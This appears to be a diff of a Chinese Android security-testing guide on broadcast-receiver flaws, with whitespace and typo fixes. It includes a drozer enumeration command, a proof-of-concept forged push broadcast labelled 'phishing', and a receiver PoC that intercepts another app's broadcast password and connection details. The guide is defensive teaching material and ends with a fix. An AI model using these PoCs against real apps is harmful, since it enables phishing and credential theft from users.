@@ -83,9 +83,7 @@ intent-filter节点与exported 属性设置组合建议
 
 4. 返回结果时需注意接收app是否会泄露信息
 
-5. 发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者
-setPackage(String packageName)
-
+5. 发送的广播包含敏感信息时需指定广播接收器，使用显式意图或者setPackage(String packageName)
 
 6. sticky broadcast粘性广播中不应包含敏感信息
 
@@ -97,7 +95,7 @@ setPackage(String packageName)
 `dz> run app.broadcast.info -a android -i`  
 
 2、查找静态广播接收器：反编译后查看配置文件查找广播接收器组件，注意exported属性  
-3、查找发送广播内的信息检索sendBroadcast与sendOrderedBroadcast，注意setPackage方法于receiverPermission变量。  
+3、查找发送广播内的信息检索sendBroadcast与sendOrderedBroadcast，注意setPackage方法与receiverPermission变量。  
 发送测试广播  
 ```
 adb shell：
@@ -116,31 +114,31 @@ sendBroadcast(i);
 接收指定广播  
 ``` java
 public class Receiver extends BroadcastReceiver {
-private final String ACCOUNT_NAME = "account_name";
-private final String ACCOUNT_PWD = "account_password";
-private final String ACCOUNT_TYPE = "account_type";
-private void doLog(Context paramContext, Intent paramIntent)
-{
-    String name;
-    String password;
-    String type;
-    do
-    {
-        name = paramIntent.getExtras().getString(ACCOUNT_NAME);
-        password = paramIntent.getExtras().getString(ACCOUNT_PWD);
-        type = paramIntent.getExtras().getString(ACCOUNT_TYPE);
-    }
-    while ((TextUtils.isEmpty(name)) || (TextUtils.isEmpty(password)) || (TextUtils.isEmpty(type)) || ((!type.equals("email")) && (!type.equals("cellphone"))));
-    Log.i("name", name);
-    Log.i("password", password);
-    Log.i("type", type);
- }
-
-public void onReceive(Context paramContext, Intent paramIntent)
-{
-  if (TextUtils.equals(paramIntent.getAction(), "account"))
-  doLog(paramContext, paramIntent);
- }
+	private final String ACCOUNT_NAME = "account_name";
+	private final String ACCOUNT_PWD = "account_password";
+	private final String ACCOUNT_TYPE = "account_type";
+	private void doLog(Context paramContext, Intent paramIntent)
+	{
+	    String name;
+	    String password;
+	    String type;
+	    do
+	    {
+	        name = paramIntent.getExtras().getString(ACCOUNT_NAME);
+	        password = paramIntent.getExtras().getString(ACCOUNT_PWD);
+	        type = paramIntent.getExtras().getString(ACCOUNT_TYPE);
+	    }
+	    while ((TextUtils.isEmpty(name)) || (TextUtils.isEmpty(password)) || (TextUtils.isEmpty(type)) || ((!type.equals("email")) && (!type.equals("cellphone"))));
+	    Log.i("name", name);
+	    Log.i("password", password);
+	    Log.i("type", type);
+	 }
+	
+	public void onReceive(Context paramContext, Intent paramIntent)
+	{
+	  if (TextUtils.equals(paramIntent.getAction(), "account"))
+	  doLog(paramContext, paramIntent);
+	 }
 
 }
 ```
@@ -154,53 +152,50 @@ i.setAction("com.baidu.android.pushservice.action.MESSAGE");
 
 Bundle b = new Bundle();
 
-
 try
 {
 
-
-JSONObject jsobject = new JSONObject();
-
-
-//1. phishing
-
-JSONObject custom_content_js = new JSONObject();
-
-jsobject.put("title", "a big surprise!!!");
-
-jsobject.put("description", "");
-
-//jsobject.put("url", "http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk");
-
-jsobject.put("url", "http://drops.wooyun.org/webview.html");
-
-
-
-JSONObject customcontent_js = new JSONObject();
-
-customcontent_js.put("type", "1");
-
-customcontent_js.put("msg_type", "resources_push");
-
-customcontent_js.put("uk", "1");
-
-customcontent_js.put("shareId", "1");
-
-jsobject.put("custom_content", customcontent_js);
-
-
-
-String cmd  = jsobject.toString();
-
-b.putByteArray("message", cmd.getBytes("UTF-8"));
-
+	JSONObject jsobject = new JSONObject();
+	
+	//1. phishing
+	
+	JSONObject custom_content_js = new JSONObject();
+	
+	jsobject.put("title", "a big surprise!!!");
+	
+	jsobject.put("description", "");
+	
+	//jsobject.put("url", "http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk");
+	
+	jsobject.put("url", "http://drops.wooyun.org/webview.html");
+	
+	
+	
+	JSONObject customcontent_js = new JSONObject();
+	
+	customcontent_js.put("type", "1");
+	
+	customcontent_js.put("msg_type", "resources_push");
+	
+	customcontent_js.put("uk", "1");
+	
+	customcontent_js.put("shareId", "1");
+	
+	jsobject.put("custom_content", customcontent_js);
+	
+	
+	
+	String cmd  = jsobject.toString();
+	
+	b.putByteArray("message", cmd.getBytes("UTF-8"));
+	
 }
 catch (Exception e)
 {
 
-// TODO Auto-generated catch block
+	// TODO Auto-generated catch block
 
-e.printStackTrace();
+	e.printStackTrace();
 }
 ```
 ### 案例2：拒绝服务
@@ -213,36 +208,36 @@ e.printStackTrace();
 隐式意图发送敏感信息
 ``` java
 public class ServerService extends Service {
-// ...
-private void d() {
-// ...
-Intent v1 = new Intent();
-v1.setAction("com.sample.action.server_running");
-v1.putExtra("local_ip", v0.h);
-v1.putExtra("port", v0.i);
-v1.putExtra("code", v0.g);
-v1.putExtra("connected", v0.s);
-v1.putExtra("pwd_predefined", v0.r);
-if (!TextUtils.isEmpty(v0.t)) {
-  v1.putExtra("connected_usr", v0.t);
-}
-}
-this.sendBroadcast(v1);
+	// ...
+	private void d() {
+		// ...
+		Intent v1 = new Intent();
+		v1.setAction("com.sample.action.server_running");
+		v1.putExtra("local_ip", v0.h);
+		v1.putExtra("port", v0.i);
+		v1.putExtra("code", v0.g);
+		v1.putExtra("connected", v0.s);
+		v1.putExtra("pwd_predefined", v0.r);
+		if (!TextUtils.isEmpty(v0.t)) {
+		  v1.putExtra("connected_usr", v0.t);
+		}
+	}
+	this.sendBroadcast(v1);
 }
 
 接收POC
 public class BcReceiv extends BroadcastReceiver {
-@Override
-public void onReceive(Context context, Intent intent){
-
-String s = null;
-if (intent.getAction().equals("com.sample.action.server_running")){
-  String pwd = intent.getStringExtra("connected");
-  s = "Airdroid  => [" + pwd + "]/" + intent.getExtras();
-}
-Toast.makeText(context, String.format("%s Received", s),
-               Toast.LENGTH_SHORT).show();
-}
+	@Override
+	public void onReceive(Context context, Intent intent){
+	
+		String s = null;
+		if (intent.getAction().equals("com.sample.action.server_running")){
+		  String pwd = intent.getStringExtra("connected");
+		  s = "Airdroid  => [" + pwd + "]/" + intent.getExtras();
+		}
+		Toast.makeText(context, String.format("%s Received", s),
+		               Toast.LENGTH_SHORT).show();
+	}
 }
 ```
 修复后代码，使用 LocalBroadcastManager.sendBroadcast() 发出的广播只能被app自身广播接收器接收。
